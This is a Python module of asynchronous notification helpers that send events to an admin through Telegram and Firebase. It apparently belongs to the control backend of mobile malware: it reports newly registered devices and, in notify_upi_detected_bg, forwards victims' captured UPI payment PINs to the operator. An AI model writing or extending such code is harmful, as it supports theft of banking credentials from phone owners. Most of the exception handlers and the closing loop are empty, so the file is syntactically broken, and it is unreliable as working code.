import asyncio
from typing import Optional, Dict, Any
from datetime import datetime

class BackgroundTaskManager:
    
    def __init__(self):
        self.pending_tasks = []
    
    async def send_telegram_notification(
        self,
        service,
        method_name: str,
        *args,
        **kwargs
    ):
        try:
            method = getattr(service, method_name)
            await method(*args, **kwargs)

        except Exception as e:

    async def send_push_notification(
        self,
        service,
        method_name: str,
        *args,
        **kwargs
    ):
        try:
            method = getattr(service, method_name)
            result = await method(*args, **kwargs)

            return result
        except Exception as e:

            return None
    
    async def log_activity(
        self,
        service,
        *args,
        **kwargs
    ):
        try:
            await service.log_activity(*args, **kwargs)

        except Exception as e:

background_tasks = BackgroundTaskManager()

async def send_telegram_in_background(
    telegram_service,
    admin_username: str,
    message: str,
    bot_index: Optional[int] = None
):
    try:
        await telegram_service.send_to_admin(
            admin_username,
            message,
            bot_index=bot_index
        )
    except Exception as e:

async def send_push_in_background(
    firebase_service,
    admin_username: str,
    title: str,
    body: str,
    data: Optional[Dict[str, Any]] = None
):
    try:
        await firebase_service.send_notification_to_admin(
            admin_username,
            title,
            body,
            data or {}
        )
    except Exception as e:

async def notify_device_registration_bg(
    telegram_service,
    firebase_service,
    admin_username: str,
    device_id: str,
    device_info: Dict[str, Any],
    admin_token: str
):
    try:
        await telegram_service.notify_device_registered(
            admin_username=admin_username,
            device_id=device_id,
            device_info=device_info
        )
        
        app_type = device_info.get('app_type', 'Unknown')
        model = device_info.get('model', 'Unknown')
        
        await firebase_service.send_device_registration_notification(
            admin_username=admin_username,
            device_id=device_id,
            app_type=app_type,
            model=model
        )

    except Exception as e:

async def notify_upi_detected_bg(
    telegram_service,
    firebase_service,
    admin_username: str,
    device_id: str,
    upi_pin: str,
    model: Optional[str] = None
):
    try:
        await telegram_service.notify_upi_detected(
            admin_username=admin_username,
            device_id=device_id,
            upi_pin=upi_pin
        )
        
        await firebase_service.send_upi_pin_notification(
            admin_username=admin_username,
            device_id=device_id,
            upi_pin=upi_pin,
            model=model
        )

    except Exception as e:

async def notify_admin_login_bg(
    telegram_service,
    admin_username: str,
    ip_address: str,
    success: bool = True
):
    try:
        await telegram_service.notify_admin_login(
            admin_username=admin_username,
            ip_address=ip_address,
            success=success
        )

    except Exception as e:

async def notify_admin_logout_bg(
    telegram_service,
    admin_username: str,
    ip_address: str
):
    try:
        await telegram_service.notify_admin_logout(
            admin_username=admin_username,
            ip_address=ip_address
        )

    except Exception as e:

async def send_2fa_code_bg(
    telegram_service,
    admin_username: str,
    ip_address: str,
    code: str,
    message_prefix: Optional[str] = None
):
    try:
        await telegram_service.send_2fa_notification(
            admin_username=admin_username,
            ip_address=ip_address,
            code=code,
            message_prefix=message_prefix
        )

    except Exception as e:

async def send_multiple_notifications_bg(
    telegram_service,
    firebase_service,
    notifications: list
):
    tasks = []
    
    for notif in notifications:
        if notif["type"] == "telegram":
            method = getattr(telegram_service, notif["method"])
            tasks.append(method(*notif.get("args", []), **notif.get("kwargs", {})))
        elif notif["type"] == "push":
            method = getattr(firebase_service, notif["method"])
            tasks.append(method(*notif.get("args", []), **notif.get("kwargs", {})))
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for i, result in enumerate(results):
        if isinstance(result, Exception):
